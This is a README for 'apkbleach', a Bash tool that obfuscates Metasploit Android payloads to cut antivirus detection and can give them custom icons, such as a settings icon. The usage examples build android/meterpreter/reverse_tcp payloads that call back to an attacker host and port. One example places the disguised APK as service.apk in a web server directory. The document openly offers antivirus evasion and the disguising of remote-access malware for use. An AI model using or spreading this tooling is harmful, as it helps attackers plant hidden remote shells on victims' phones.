# apkbleach
This BASH script will remove the obvious fingerprints of metasploit through out a given apk file. It also gives the option to inject a custom app icon. This script is constantly being improved so revisions will be made frequently. This is the PUBLIC version of this script thats only triggers 12 of 60 anti-viruses. When the metasploit payload generated by msfvenom with out this script triggers 28 of 60. I am always looking for feed back and ways to improve the code and its techniques. Please feel free to contribute or contact me at graylagx2@gmail.com

! It is highly recomended to let the script generate the payload with nops
   
Usage: 

         Usage: apkbleach -g <android/payload/to/use LHOST=ip-address-to-use LPORT=port-to-use> -i <path/to/image.png> -o  <path/to/outputname.apk>

Options: 

      -g <android/payload/to/use LHOST=ip-address-to-use LPORT=port-to-use>
          Generates obfuscated payload with nops
  
      -i <path/to/image.png> [ use -i --list ] to list defaults
          Sets image as the icon of the file.apk
  
      -o  <path/to/outputname.apk>
          Sets the name of custom output file
  
      -x <path/to/apk>
          Uses pre generated metasploit payload to obfuscate
  
      -h  Help menu

Examples: 

         ./apkbleach -g android/meterpreter/reverse_tcp LHOST=192.168.1.12 LPORT=4444

         ./apkbleach -x /root/msf.apk

         ./apkbleach -g android/meterpreter/reverse_tcp LHOST=192.168.1.12 LPORT=4444 -i ICONS/settings.png 

         ./apkbleach -g android/meterpreter/reverse_tcp LHOST=192.168.1.12 LPORT=4444 -i ICONS/settings.png -o /var/www/html/service.apk